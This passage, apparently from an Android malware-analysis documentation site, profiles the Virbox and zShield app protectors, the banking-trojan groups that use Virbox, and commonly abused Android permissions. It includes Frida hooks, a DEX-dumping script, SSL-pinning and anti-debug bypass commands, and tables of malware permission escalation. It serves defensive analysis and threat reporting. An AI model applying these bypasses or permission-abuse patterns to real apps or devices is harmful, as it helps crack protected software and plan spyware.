its network communications pass through standard Android APIs. Hooking at the network layer captures C2 URLs, exfiltrated data, and command protocols regardless of code protection:</p> <pre><code>Java.perform(function() {\n    var URL = Java.use(\"java.net.URL\");\n    URL.$init.overload(\"java.lang.String\").implementation = function(url) {\n        console.log(\"[NET] URL: \" + url);\n        this.$init(url);\n    };\n\n    var HttpURLConnection = Java.use(\"java.net.HttpURLConnection\");\n    HttpURLConnection.setRequestProperty.implementation = function(key, value) {\n        console.log(\"[NET] Header: \" + key + \": \" + value);\n        this.setRequestProperty(key, value);\n    };\n\n    var OkHttpClient;\n    try {\n        OkHttpClient = Java.use(\"okhttp3.OkHttpClient\");\n        var RealCall = Java.use(\"okhttp3.internal.connection.RealCall\");\n        RealCall.execute.implementation = function() {\n            var request = this.request();\n            console.log(\"[OKHTTP] \" + request.method() + \" \" + request.url());\n            return this.execute();\n        };\n    } catch(e) {}\n\n    try {\n        var WebView = Java.use(\"android.webkit.WebView\");\n        WebView.loadUrl.overload(\"java.lang.String\").implementation = function(url) {\n            console.log(\"[WEBVIEW] loadUrl: \" + url);\n            this.loadUrl(url);\n        };\n    } catch(e) {}\n});\n</code></pre>"},{"location":"packers/virbox/#partial-analysis-strategy","title":"Partial Analysis Strategy","text":"<p>When full unpacking is infeasible (which is the common case for Virbox-virtualized samples), shift to behavioral analysis:</p> <ul> <li>Network traffic: Use mitmproxy or Burp Suite with SSL pinning bypass to capture all HTTP/HTTPS traffic. C2 URLs, exfiltration endpoints, and command structures are all visible regardless of code protection.</li> <li>File system activity: Monitor file creation, reads, and writes using <code>inotifywait</code> or Frida hooks on <code>open()</code>, <code>write()</code>, <code>unlink()</code>. Credential storage, configuration files, and staging directories become visible.</li> <li>IPC observation: Hook <code>startActivity</code>, <code>startService</code>, <code>sendBroadcast</code>, and <code>ContentResolver</code> operations to map the application's interaction with other components and apps.</li> <li>Accessibility service abuse: If the malware registers an AccessibilityService, hook <code>onAccessibilityEvent</code> to log every UI interaction the malware performs.</li> <li>SharedPreferences: Hook <code>SharedPreferences.Editor</code> methods to capture configuration values the malware stores locally.</li> </ul> <p>This behavioral approach often yields sufficient intelligence for threat reporting without ever recovering the original bytecode.</p>"},{"location":"packers/virbox/#malware-abuse","title":"Malware Abuse","text":""},{"location":"packers/virbox/#klopatra-banking-trojan-2025","title":"Klopatra Banking Trojan (2025)","text":"<p>Virbox was discovered protecting the Klopatra Android banking trojan targeting Turkish financial institutions.</p> <ul> <li>Described as \"rarely seen in the Android threat landscape\"</li> <li>Combined with native libraries for maximum evasion</li> <li>Analysis only succeeded via unprotected development build</li> <li>Protection \"drastically increases time and expertise required\"</li> </ul>"},{"location":"packers/virbox/#gigabud-spynote-infrastructure-2024","title":"Gigabud + SpyNote Infrastructure (2024)","text":"<p>Zimperium zLabs revealed that both Gigabud (a banking credential stealer) and SpyNote were protected by Virbox across shared distribution infrastructure. The investigation identified 79 phishing sites and 11 C2 servers distributing both families, targeting 50+ financial apps. This represents the first documented case of Virbox protecting multiple distinct malware families operating through coordinated infrastructure.</p>"},{"location":"packers/virbox/#goldfactory-group","title":"GoldFactory Group","text":"<p>GoldFactory is the Chinese-speaking threat group that standardized on Virbox across its entire malware portfolio. The group operates GoldDigger, GoldPickaxe, GoldDiggerPlus, and Gigabud -- all Android banking trojans that use Virbox as their primary protection layer.</p>"},{"location":"packers/virbox/#why-virbox","title":"Why Virbox","text":"<p>GoldFactory's selection of Virbox is not arbitrary. Several factors make it the natural choice for a Chinese-speaking cybercrime operation focused on financial fraud:</p> <ul> <li>Chinese origin: SenseShield Technology operates primarily in Chinese, with documentation, support, and licensing infrastructure accessible to Chinese-speaking buyers. Procurement is straightforward compared to Western protectors like DexGuard or Arxan.</li> <li>VM-level protection: Financial fraud malware has a short operational window. Virbox's DEX virtualization buys time against incident responders and malware analysts -- even partial analysis requires days of effort per sample.</li> <li>RASP suite: The built-in anti-debugging, anti-rooting, and anti-emulation checks provide defense-in-depth without requiring the malware authors to implement their own.</li> <li>Legitimate cover: Because Virbox is a legitimate commercial product used by many non-malicious apps, its presence alone does not flag the APK as malicious in automated scanning pipelines.</li> </ul>"},{"location":"packers/virbox/#goldpickaxe-and-biometric-theft","title":"GoldPickaxe and Biometric Theft","text":"<p>GoldPickaxe is the most technically notable member of the GoldFactory family. It steals facial biometric data from victims by tricking them into recording face videos, then uses AI-generated deepfakes to bypass bank face-verification systems. The Android variant wraps this entire workflow in Virbox virtualization, meaning the facial capture logic, deepfake preparation, and exfiltration code are all protected by the VM. This makes it exceptionally difficult to analyze the biometric theft mechanism through static analysis.</p> <p>The iOS variant of GoldPickaxe cannot use Virbox (which does not support iOS app protection in the same way), so cross-platform comparison between the Android and iOS variants has been one route for analysts to infer what the Android variant's virtualized code does.</p>"},{"location":"packers/virbox/#gigabud-and-infrastructure-overlap","title":"Gigabud and Infrastructure Overlap","text":"<p>Zimperium's September 2024 investigation revealed that Gigabud and SpyNote shared distribution infrastructure (79 phishing sites, 11 C2 servers), with both families protected by Virbox. Cyble's August 2024 analysis confirmed code-level overlap between Gigabud and GoldDigger, with both using <code>libstrategy.so</code> for UI interaction alongside Virbox packing. This makes GoldFactory the first documented threat group to deploy Virbox consistently across multiple distinct malware families operating through coordinated infrastructure.</p>"},{"location":"packers/virbox/#attribution-indicators","title":"Attribution Indicators","text":"Indicator Details Language Chinese-language strings in development artifacts, Chinese-language C2 panels Targeting Southeast Asia (Thailand, Vietnam, Philippines), expanding to Latin America and South Africa Operational model Highly localized lures impersonating government services and banking apps Technical signature Consistent use of Virbox across all family members, shared <code>libstrategy.so</code> library Timeline GoldDigger (2023), GoldDiggerPlus (2023-2024), GoldPickaxe (2024), Gigabud (active since 2022, linked 2024)"},{"location":"packers/virbox/#analyst-workflow","title":"Analyst Workflow","text":""},{"location":"packers/virbox/#step-by-step-procedure","title":"Step-by-Step Procedure","text":"<p>Step 1: Triage and Identification</p> <p>Confirm Virbox protection by checking for the artifacts listed in the Identification section. Run APKiD if available. Look for <code>libvirbox_*.so</code> in the lib or assets directory, hex-based package names, and the <code>\"virbox\"</code> string tag.</p> <p>Step 2: Determine Virtualization Scope</p> <p>Not all methods in a Virbox-protected APK are virtualized. Developers choose which classes and methods to protect. Decompile the APK with jadx and examine the output:</p> <ul> <li>Methods that decompile normally contain standard Dalvik bytecode and are not virtualized</li> <li>Methods that show only a <code>native</code> declaration with a hex-prefixed name (e.g., <code>I6f7de22b_02</code>) are virtualized</li> <li>If jadx recovers substantial application logic, the sample is only partially virtualized, and static analysis remains viable for the non-virtualized portions</li> </ul> <p>Step 3: Static Analysis of Non-Virtualized Code</p> <p>Extract everything possible from the readable portions:</p> <ul> <li>AndroidManifest.xml: permissions, components, intent filters</li> <li>Non-virtualized Activities and Services: application flow, UI logic</li> <li>Resource files: strings.xml (may contain URLs, configuration), layouts</li> <li>Receiver registrations: broadcast-based triggers</li> </ul> <p>Step 4: Set Up Dynamic Analysis Environment</p> <p>Prepare a rooted device or emulator with RASP bypass scripts loaded. Use spawn mode with Frida to inject the RASP bypass before Virbox's checks execute:</p> <pre><code>frida -U -f com.target.package -l rasp_bypass.js --no-pause\n</code></pre> <p>Use reFrida to reduce Frida's detection footprint. Load the <code>System.exit</code> and <code>Runtime.exit</code> blockers first, then layer additional hooks.</p> <p>Step 5: Network Traffic Capture</p> <p>Set up mitmproxy or Burp Suite as the device proxy. Use objection or a Frida script for SSL pinning bypass:</p> <pre><code>objection -g com.target.package explore -s \"android sslpinning disable\"\n</code></pre> <p>Run the application through its full workflow. Capture all HTTP/HTTPS requests. C2 endpoints, exfiltration URLs, and command protocols are visible in cleartext after SSL bypass regardless of Virbox protection.</p> <p>Step 6: Behavioral Hooking</p> <p>Deploy Frida hooks for the behavioral observation points described in the Partial Analysis Strategy section. Focus on:</p> <ul> <li>Network calls (URL construction, HTTP requests)</li> <li>File system operations (credential storage, configuration drops)</li> <li>IPC (inter-component communication, broadcasts)</li> <li>Accessibility events (if the malware uses AccessibilityService)</li> <li>SMS operations (interception, exfiltration)</li> </ul> <p>Step 7: Report and Indicator Extraction</p> <p>Compile findings into actionable intelligence:</p> <ul> <li>Network IOCs: C2 domains, IP addresses, URL patterns</li> <li>File system IOCs: dropped file names, paths, hashes</li> <li>Behavioral IOCs: permission abuse patterns, accessibility actions</li> <li>Infrastructure mapping: shared hosting, certificate reuse, domain registration patterns</li> </ul>"},{"location":"packers/virbox/#decision-tree","title":"Decision Tree","text":"<pre><code>Is libvirbox_*.so present?\n\u251c\u2500\u2500 No \u2192 Not Virbox-protected, use standard analysis\n\u2514\u2500\u2500 Yes \u2192 Virbox confirmed\n    \u2502\n    Does jadx decompile application methods?\n    \u251c\u2500\u2500 Most methods readable \u2192 Partially virtualized\n    \u2502   \u251c\u2500\u2500 Analyze non-virtualized code statically\n    \u2502   \u251c\u2500\u2500 Focus dynamic analysis on virtualized methods\n    \u2502   \u2514\u2500\u2500 Cross-reference static and dynamic findings\n    \u2514\u2500\u2500 Most methods are native stubs \u2192 Fully virtualized\n        \u251c\u2500\u2500 Skip static code analysis\n        \u251c\u2500\u2500 Go fully dynamic\n        \u251c\u2500\u2500 Focus on network traffic capture\n        \u251c\u2500\u2500 Deploy behavioral hooks\n        \u2514\u2500\u2500 Extract IOCs from observable behavior\n</code></pre>"},{"location":"packers/virbox/#tool-selection","title":"Tool Selection","text":"Tool Purpose reFrida Frida with reduced detection footprint for hooking Virbox-protected apps frida-dexdump Dump non-virtualized DEX from memory (limited against virtualized methods) mitmproxy Transparent HTTP/HTTPS proxy for C2 extraction objection SSL pinning bypass, runtime exploration jadx Decompile non-virtualized portions, manifest analysis APKiD Identify Virbox and determine protection type Ghidra Analyze <code>libvirbox_*.so</code> native library (VM interpreter RE)"},{"location":"packers/virbox/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Dimension Virbox DexGuard DexProtector Arxan (Digital.ai) Chinese Packers Origin China (SenseShield) Belgium (Guardsquare) USA (Licel) USA (Digital.ai) China (various) DEX Protection Virtualization + Encryption Encryption + Obfuscation Encryption + Native bridge Obfuscation + Guard network Encryption (mostly) VM-based Protection Yes (core feature) No No No Rare (some Tencent Legu variants) Native Protection Code encryption + Virtualization Limited vtable hooking Guard mesh + Obfuscation Basic encryption RASP Anti-debug, root, emulator, injection Anti-tamper, root, debug Full RASP suite (EMVCo certified) Environmental checks, tamper detection Basic anti-debug Unpacking Difficulty Very high (virtualization) Medium (encryption recoverable) Medium-high (native bridge) High (guard network) Low-medium (well-documented) frida-dexdump Effective? No (virtualized methods) Partially Partially N/A (obfuscation, not encryption) Yes (most families) Static Analysis Infeasible for VM code Possible after deobfuscation Possible after decryption Difficult but possible Possible after unpacking Malware Adoption GoldFactory, Klopatra, Gigabud Widespread across families Occasional Rare in malware Dominant in Chinese malware Build Integration Post-build (APK input) Gradle plugin (source required) Post-build (APK/AAB input) Build-time + Post-build Post-build (APK upload) Cost to Attacker Commercial license required Commercial license required Commercial license required Commercial license required Free or cheap Google Play Compatibility Limited (DEX encryption may fail checks) Full Full Full Limited"},{"location":"packers/virbox/#references","title":"References","text":"<ul> <li>Virbox Protector Documentation</li> <li>Virbox Android Protection</li> <li>Virbox Best Practices</li> <li>SenseShield GitHub</li> <li>Klopatra Analysis - Cleafy Labs</li> <li>Gigabud Threat Network - Zimperium zLabs</li> <li>GoldDigger and Gigabud Overlap - Cyble</li> <li>Gigabud Banking Malware - Group-IB</li> <li>GoldFactory Threat Group - Group-IB</li> <li>GoldPickaxe iOS Trojan - Group-IB</li> <li>ESET H1 2024 Threat Report - GoldDigger/GoldFactory</li> <li>ThreatFabric 2024 Mobile Threat Landscape</li> <li>Gigabud RAT - Cyble (Initial Discovery)</li> </ul>"},{"location":"packers/zshield/","title":"Zimperium zShield","text":"<p>zShield is the application hardening and protection component of Zimperium's MAPS (Mobile Application Protection Suite). It applies binary-level obfuscation, encryption, and runtime protection to Android and iOS applications. zShield is distinct from Zimperium's other products: zIPS (device-level MTD agent), zDefend (embeddable RASP SDK for third-party apps), and zKeyBox (white-box cryptography).</p>"},{"location":"packers/zshield/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Zimperium Origin Dallas, Texas, USA Type Commercial Protector/Obfuscator (part of MAPS suite) Platforms Android, iOS Suite Components zShield (app hardening), zScan (app security testing), zDefend (in-app RASP SDK), zKeyBox (white-box crypto) Acquisition whiteCryption acquired by Zimperium in 2021 (source of zKeyBox)"},{"location":"packers/zshield/#maps-suite-context","title":"MAPS Suite Context","text":"<p>Zimperium's MAPS suite addresses different layers of mobile security. Understanding the distinctions matters for accurate identification:</p> Product Function Deployment zShield Binary protection, obfuscation, encryption Build-time, applied to APK/IPA zIPS Mobile Threat Defense agent (device-level) Standalone app on managed devices zDefend RASP SDK embedded in third-party apps SDK integrated at build time zKeyBox White-box cryptography library SDK/library integration zScan Automated app security scanning Cloud-based analysis <p>zShield is the component relevant to reverse engineering and unpacking. zDefend and zIPS are endpoint protection products, not application protectors.</p>"},{"location":"packers/zshield/#identification","title":"Identification","text":""},{"location":"packers/zshield/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD identifies zShield through segment-based analysis of native libraries:</p> <pre><code>packer : Zimperium (zShield)\nanti_hook : syscalls\n</code></pre> <p>The segment-based detection is significant because it works regardless of the randomized library naming that zShield applies to its native components.</p>"},{"location":"packers/zshield/#file-artifacts","title":"File Artifacts","text":"Artifact Description Native libraries Randomized names (e.g., <code>liboptipkawfn.so</code>), ~3MB, packed/encrypted ELF Asset files <code>assets/&lt;randomstring&gt;/0.odex</code> -- truncated to 17-41 bytes .szip assets ~8MB files containing encrypted and compressed DEX bytecode Library naming Substring between <code>lib</code> and <code>.so</code> is randomized between builds"},{"location":"packers/zshield/#randomized-library-naming","title":"Randomized Library Naming","text":"<p>zShield randomizes native library filenames on each build. Examples observed across different protected applications:</p> <pre><code>liboptipkawfn.so\nlibxqwemnzrvt.so\nlibhgkdpfyauc.so\n</code></pre> <p>The randomized substring changes between builds of the same application. This defeats static file-based detection rules that match on fixed library names, but APKiD's segment-based ELF analysis detects zShield regardless because it examines the binary structure rather than the filename.</p>"},{"location":"packers/zshield/#asset-structure","title":"Asset Structure","text":"<p>Protected applications contain asset files in a randomized directory:</p> <pre><code>assets/a8f3c2d1e9/0.odex     (17-41 bytes, truncated)\nassets/a8f3c2d1e9/data.szip  (~8MB, encrypted+compressed DEX)\n</code></pre> <p>The <code>0.odex</code> file is intentionally truncated and serves as a marker or metadata stub. The <code>.szip</code> files contain the actual encrypted and compressed DEX bytecode that is unpacked at runtime.</p>"},{"location":"packers/zshield/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/zshield/#elf-self-decryption-xxtea","title":"ELF Self-Decryption (XXTEA)","text":"<p>The native libraries ship with their ELF body encrypted using the XXTEA cipher. At load time, the library's initialization code decrypts itself before execution. XXTEA is a lightweight block cipher that provides fast decryption with minimal code footprint -- suitable for a self-decrypting stub but not cryptographically strong by modern standards.</p>"},{"location":"packers/zshield/#ollvm-style-control-flow-flattening","title":"OLLVM-Style Control Flow Flattening","text":"<p>After the ELF body is decrypted, the underlying native code uses OLLVM-style control flow flattening. Original control flow structures (if/else, loops, switch) are transformed into a state-machine dispatcher pattern where a central loop reads a state variable and dispatches to the appropriate basic block. This defeats pattern-based decompilation in Ghidra and IDA Pro, producing unreadable switch-based control flow graphs.</p>"},{"location":"packers/zshield/#string-and-buffer-encryption","title":"String and Buffer Encryption","text":"<p>Strings and data buffers within native libraries are encrypted using a weak cipher with a 32-bit key. The encryption is applied at the individual string/buffer level, with decryption routines called inline before each use. The 32-bit key space makes brute-force feasible if the cipher and ciphertext can be extracted from the binary.</p>"},{"location":"packers/zshield/#dex-protection","title":"DEX Protection","text":"<p>DEX bytecode is encrypted and compressed into <code>.szip</code> asset files. At runtime, the native library unpacks and decrypts these assets, loading the recovered DEX into the Dalvik/ART runtime. The original <code>classes.dex</code> in the APK contains only stub code that bootstraps the native library and triggers DEX unpacking.</p>"},{"location":"packers/zshield/#obfuscation-layers","title":"Obfuscation Layers","text":"Layer Target Class/field/method renaming Java/Kotlin identifiers Native library name randomization <code>.so</code> filenames Resource name obfuscation Android resource identifiers Symbol stripping Native library exports"},{"location":"packers/zshield/#anti-debugging","title":"Anti-Debugging","text":"<p>Detects debugging through ptrace status checks, TracerPid monitoring in <code>/proc/self/status</code>, and detection of known debugger processes (IDA, gdb, lldb, jeb).</p>"},{"location":"packers/zshield/#anti-hooking-syscall-based","title":"Anti-Hooking (Syscall-Based)","text":"<p>zShield uses direct syscalls rather than libc wrappers for security-critical operations. This bypasses Frida's <code>Interceptor.attach</code> on libc functions like <code>open</code>, <code>read</code>, <code>fopen</code> because the hooked libc functions are never called. The syscall-based approach is identified by APKiD as <code>anti_hook : syscalls</code>.</p>"},{"location":"packers/zshield/#integrity-checks","title":"Integrity Checks","text":"<p>Runtime verification of APK signatures, DEX checksums, and native library integrity. Detects repackaging and binary modification.</p>"},{"location":"packers/zshield/#ssl-pinning","title":"SSL Pinning","text":"<p>Certificate pinning implementation that validates server certificates against embedded pins, independent of Android's <code>NetworkSecurityConfig</code>.</p>"},{"location":"packers/zshield/#frida-detection-via-procnetunix","title":"Frida Detection via /proc/net/unix","text":"<p>zShield scans <code>/proc/net/unix</code> for Frida-related Unix domain sockets. When frida-server is running on a device, it creates Unix domain sockets that appear in this procfs file. The scan looks for socket paths containing <code>frida</code>, <code>linjector</code>, or other Frida-associated strings.</p> <p>This detection vector is well-documented and bypassable by either:</p> <ul> <li>Renaming Frida's socket paths (custom Frida build)</li> <li>Hooking the <code>open</code> syscall at the kernel level</li> <li>Using a Frida build that avoids creating identifiable sockets</li> </ul>"},{"location":"packers/zshield/#unpacking-approaches","title":"Unpacking Approaches","text":""},{"location":"packers/zshield/#xxtea-elf-unpacker-david-buchanan","title":"XXTEA ELF Unpacker (David Buchanan)","text":"<p>David Buchanan (DavidBuchanan314) published an analysis of the Rabbit R1 device APK that was protected by zShield. The analysis included an XXTEA unpacker that strips the ELF encryption layer from zShield's native libraries.</p> <p>The unpacker targets the self-decryption stub, extracting the XXTEA key from the initialization routine and decrypting the ELF body. After unpacking:</p> <ul> <li>The ELF structure is restored and loadable in Ghidra/IDA</li> <li>Function boundaries become identifiable</li> <li>The code remains control-flow flattened (OLLVM-style)</li> <li>Strings remain individually encrypted with the 32-bit key cipher</li> </ul> <p>The XXTEA layer is the outermost protection. Removing it is necessary but not sufficient for full analysis.</p>"},{"location":"packers/zshield/#post-xxtea-analysis","title":"Post-XXTEA Analysis","text":"<p>After removing the XXTEA encryption, the analyst faces two remaining layers:</p> <p>Control flow flattening: The OLLVM-style dispatcher pattern must be manually or semi-automatically deflattened. Tools like D-810 (IDA plugin) or custom Ghidra scripts can partially recover original control flow, but results vary by sample.</p> <p>String encryption: With a 32-bit key space, the string cipher is brute-forceable if the cipher algorithm and ciphertext can be identified within the binary. Alternatively, dynamic analysis with Frida can intercept decrypted strings at runtime.</p>"},{"location":"packers/zshield/#bypassing-syscall-based-anti-hooking","title":"Bypassing Syscall-Based Anti-Hooking","text":"<p>The syscall-based approach prevents standard libc hooking but has limitations:</p> <ul> <li>Kernel-level hooking (requires root) can intercept syscalls</li> <li>The syscall numbers are architecture-specific and identifiable in the binary</li> <li>Patching the native library to replace syscall instructions with libc calls re-enables standard Frida hooking (requires defeating integrity checks first)</li> </ul>"},{"location":"packers/zshield/#dex-recovery","title":"DEX Recovery","text":"<p>The encrypted DEX in <code>.szip</code> assets can potentially be recovered by:</p> <ol> <li>Allowing the native library to perform decryption</li> <li>Hooking the class loading mechanism to intercept decrypted DEX data</li> <li>Using frida-dexdump after the application has fully initialized and DEX has been loaded into the ART runtime</li> </ol> <pre><code>Java.perform(function() {\n    var DexFile = Java.use(\"dalvik.system.DexFile\");\n    var InMemoryDexClassLoader = Java.use(\"dalvik.system.InMemoryDexClassLoader\");\n\n    InMemoryDexClassLoader.$init.overload(\"java.nio.ByteBuffer\", \"java.lang.ClassLoader\").implementation = function(buf, parent) {\n        var size = buf.remaining();\n        console.log(\"[zShield] InMemoryDexClassLoader loading DEX, size: \" + size);\n        var bytes = new Uint8Array(size);\n        for (var i = 0; i &lt; size; i++) {\n            bytes[i] = buf.get(buf.position() + i) &amp; 0xff;\n        }\n        var f = new File(\"/data/local/tmp/zshield_dex_\" + size + \".dex\", \"wb\");\n        f.write(bytes.buffer);\n        f.close();\n        console.log(\"[zShield] DEX dumped to /data/local/tmp/zshield_dex_\" + size + \".dex\");\n        return this.$init(buf, parent);\n    };\n});\n</code></pre>"},{"location":"packers/zshield/#zkeybox-white-box-cryptography","title":"zKeyBox White-Box Cryptography","text":"<p>zKeyBox is Zimperium's white-box cryptography solution, acquired through the whiteCryption purchase in 2021. While separate from zShield's application protection, it is often deployed alongside zShield in financial applications.</p> <p>White-box cryptography embeds cryptographic keys into the code itself, making them resistant to extraction even when the attacker has full access to the binary and runtime. zKeyBox supports standard algorithms (AES, RSA, ECC) with keys that are mathematically dissolved into lookup tables and code transformations.</p> <p>For reverse engineers, zKeyBox-protected cryptographic operations are the hardest component to break. The keys do not exist as extractable byte sequences anywhere in memory or on disk -- they are distributed across transformation tables.</p>"},{"location":"packers/zshield/#industry-usage","title":"Industry Usage","text":"<p>zShield is deployed in enterprise mobile applications and specialized devices:</p> <ul> <li>Enterprise MDM/EMM-managed applications</li> <li>Rabbit R1 device firmware (documented by David Buchanan)</li> <li>Financial services applications (alongside zKeyBox)</li> <li>Government and defense mobile applications</li> </ul> <p>zShield has not been observed protecting malware samples. Zimperium's licensing model and enterprise sales process make it impractical for malware authors.</p>"},{"location":"packers/zshield/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature zShield DexGuard Appdome Arxan ELF encryption XXTEA self-decryption Limited native obfuscation Native library encryption Guard mesh Control flow OLLVM-style flattening Optional flattening Basic obfuscation Guard network DEX protection Encrypted .szip assets Class/string encryption DEX encryption Obfuscation Library naming Randomized per build Fixed (<code>libdexguard.so</code>) Fixed (<code>libloader.so</code>) Fixed naming Anti-hooking Direct syscalls libc-based detection Multi-vector Guard-based String encryption 32-bit key cipher (native) AES/XOR (DEX level) Native layer Native layer White-box crypto zKeyBox (separate product) No No TransformIT Public unpacker Yes (XXTEA layer only) Frida-based None None Malware adoption None Cracked versions in malware None Rare"},{"location":"packers/zshield/#references","title":"References","text":"<ul> <li>Zimperium MAPS Platform</li> <li>Zimperium zShield</li> <li>Zimperium zKeyBox (whiteCryption)</li> <li>APKiD -- Android Application Identifier</li> <li>David Buchanan -- Rabbit R1 Analysis</li> <li>APKiD zShield Detection Signatures</li> <li>Zimperium whiteCryption Acquisition (2021)</li> <li>OLLVM -- Obfuscator-LLVM</li> </ul>"},{"location":"permissions/","title":"Android Permissions","text":"<p>Android's permission system controls access to sensitive data and device capabilities. Permissions define what an app can do once installed, and what an attacker gains when a user grants them.</p> <p>This section covers permissions across all protection levels relevant to security research, not just the \"dangerous\" category.</p>"},{"location":"permissions/#permission-categories","title":"Permission Categories","text":""},{"location":"permissions/#dangerous-permissions-runtime","title":"Dangerous Permissions (Runtime)","text":"<p>Require explicit user grant. Most malware requests several of these.</p> Category Abuse Scenarios Calendar Event data exfiltration, schedule reconnaissance Call Log Call history theft, contact mapping Camera Covert photo/video capture Contacts Contact exfiltration, social graph mapping Location Real-time tracking, geofencing Microphone Audio surveillance Phone IMEI harvesting, call interception, premium dialing Sensors Biometric data theft Activity Recognition User behavior profiling SMS OTP interception, premium SMS fraud, C2 channel Storage File exfiltration, payload dropping Nearby Devices Device tracking, proximity attacks"},{"location":"permissions/#special-permissions","title":"Special Permissions","text":"<p>Require a settings toggle rather than a runtime dialog. Some of the most powerful permissions available.</p> Category Abuse Scenarios Special Permissions Overlay attacks, accessibility takeover, silent app installs, notification interception"},{"location":"permissions/#normal-permissions-auto-granted","title":"Normal Permissions (Auto-Granted)","text":"<p>Granted silently at install time. Often overlooked but critical for malware operation.</p> Category Abuse Scenarios Normal (Abusable) Boot persistence, C2 communication, app enumeration, battery optimization bypass"},{"location":"permissions/#permission-escalation-patterns","title":"Permission Escalation Patterns","text":"<p>Malware rarely requests all permissions at install. Instead, it escalates through stages:</p> Stage Permissions Technique Install <code>INTERNET</code>, <code>RECEIVE_BOOT_COMPLETED</code>, <code>WAKE_LOCK</code> Normal permissions, auto-granted, establish persistence and C2 Social engineering <code>BIND_ACCESSIBILITY_SERVICE</code> Instructs user to enable in Settings, often with fake security prompts Accessibility-granted <code>SYSTEM_ALERT_WINDOW</code>, <code>WRITE_SETTINGS</code>, <code>REQUEST_INSTALL_PACKAGES</code> Accessibility service clicks through permission dialogs automatically Runtime prompts <code>SMS</code>, <code>CONTACTS</code>, <code>PHONE</code>, <code>CAMERA</code> Granted via fake explanations or accessibility auto-grant Special <code>BIND_DEVICE_ADMIN</code>, <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> Enabled via Settings or accessibility for maximum device control <p>Accessibility abuse is the key escalation vector. Once granted, it can auto-approve every other permission dialog, making it the single most critical permission for malware operations.</p>"},{"location":"permissions/#android-version-impact","title":"Android Version Impact","text":"Version Permission Change Impact on Malware Android 6 (API 23) Runtime permissions introduced Malware must request dangerous permissions individually Android 8 (API 26) Background execution limits Requires <code>FOREGROUND_SERVICE</code> for persistent operation Android 10 (API 29) Background location restricted Requires <code>ACCESS_BACKGROUND_LOCATION</code> as separate grant Android 11 (API 30) Auto-revoke unused permissions, scoped storage Malware must maintain active usage or request <code>MANAGE_EXTERNAL_STORAGE</code> Android 12 (API 31) Approximate location option, Bluetooth permissions split Additional permission prompts for location and nearby devices Android 13 (API 33) Notification permission required, media permissions split Must request <code>POST_NOTIFICATIONS</code> explicitly Android 14 (API 34) Restricted implicit intents, foreground service types required Must declare specific <code>foregroundServiceType</code> Android 15 (API 35) Restricted settings enforcement Multi-step process to enable accessibility for sideloaded apps"},{"location":"permissions/#minimum-viable-permission-sets","title":"Minimum Viable Permission Sets","text":"<p>The smallest permission set that enables each malware category:</p> Malware Type Minimum Permissions Banking trojan (overlay) <code>INTERNET</code> + <code>SYSTEM_ALERT_WINDOW</code> + <code>BIND_ACCESSIBILITY_SERVICE</code> + <code>RECEIVE_SMS</code> Banking trojan (ATS) <code>INTERNET</code> + <code>BIND_ACCESSIBILITY_SERVICE</code> Spyware <code>INTERNET</code> + <code>CAMERA</code> + <code>RECORD_AUDIO</code> + <code>ACCESS_FINE_LOCATION</code> + <code>READ_CONTACTS</code> SMS fraud <code>INTERNET</code> + <code>SEND_SMS</code> + <code>RECEIVE_SMS</code> Ransomware <code>INTERNET</code> + <code>BIND_DEVICE_ADMIN</code> + storage permissions Clipper <code>INTERNET</code> + <code>BIND_ACCESSIBILITY_SERVICE</code> (or foreground clipboard access) <p>Medusa v2 demonstrated the trend toward reduced permission footprints, dropping from 21 to 5 permissions while maintaining full functionality by relying more heavily on accessibility services for capabilities that previously required dedicated permissions.</p>"},{"location":"permissions/activity-recognition/","title":"Activity Recognition Permissions","text":"<p>Access to physical activity data: whether the user is walking, running, cycling, driving, or stationary. Used in targeted surveillance to build behavioral profiles. Low priority for commodity malware.</p>"},{"location":"permissions/activity-recognition/#permissions","title":"Permissions","text":"Permission Abuse Potential ACTIVITY_RECOGNITION Track user's physical activity state for behavior profiling"},{"location":"permissions/activity-recognition/#exposed-data","title":"Exposed Data","text":"<p>The Activity Recognition API returns <code>DetectedActivity</code> objects, each with a type and confidence score:</p> Activity Type Intelligence Value <code>IN_VEHICLE</code> Target is driving or riding in a vehicle -- reveals commute patterns <code>ON_BICYCLE</code> Cycling activity -- narrows transport mode for physical surveillance <code>ON_FOOT</code> Walking -- baseline movement, often paired with location for route mapping <code>RUNNING</code> Exercise pattern -- reveals routine and predictable locations (gym, park) <code>STILL</code> Stationary -- indicates the target is at a fixed location (home, office, meeting) <code>TILTING</code> Device angle changed -- can infer phone pickup, pocket/table transitions <code>WALKING</code> Subset of ON_FOOT -- more granular movement classification <p>When combined with location data, activity recognition builds comprehensive movement profiles. A surveillance operator can determine not just where a target went, but how they got there, when they stopped, and how long they stayed. This is the difference between a series of GPS dots and an actionable pattern-of-life analysis.</p>"},{"location":"permissions/activity-recognition/#spyware-families","title":"Spyware Families","text":"<p>Several state-sponsored and commercial spyware families request this permission:</p> <ul> <li>Pegasus (NSO Group) -- full activity monitoring as part of its comprehensive device surveillance suite</li> <li>Hermit (RCS Lab) -- collects activity data alongside location for target profiling</li> <li>PlainGnome -- Russian-linked spyware that harvests activity states for behavioral analysis</li> </ul> <p>Commodity malware rarely bothers with this permission. The intelligence it provides is only valuable when an operator is building a sustained profile of a specific target, making it a strong indicator of targeted surveillance rather than bulk data theft.</p>"},{"location":"permissions/activity-recognition/#android-version-history","title":"Android Version History","text":"<p>Prior to Android 10 (API 29), activity recognition data was available to any app using the Google Play Services Activity Recognition API without a dedicated permission. API 29 introduced <code>ACTIVITY_RECOGNITION</code> as a runtime permission, requiring explicit user consent. This change was part of a broader push to gate sensor-derived behavioral data behind granular permissions rather than bundling it under broad grants.</p>"},{"location":"permissions/activity-recognition/activity-recognition/","title":"ACTIVITY_RECOGNITION","text":"<p>Allows detecting the user's physical activity: walking, running, cycling, driving, tilting, or stationary. Uses accelerometer, gyroscope, and other motion sensors to classify movement.</p>"},{"location":"permissions/activity-recognition/activity-recognition/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.ACTIVITY_RECOGNITION</code> Protection Level <code>dangerous</code> Permission Group <code>ACTIVITY_RECOGNITION</code> Grant Method Runtime permission dialog Introduced API 29 (Android 10) <p>Before Android 10, activity recognition data was available without any permission through the Google Activity Recognition 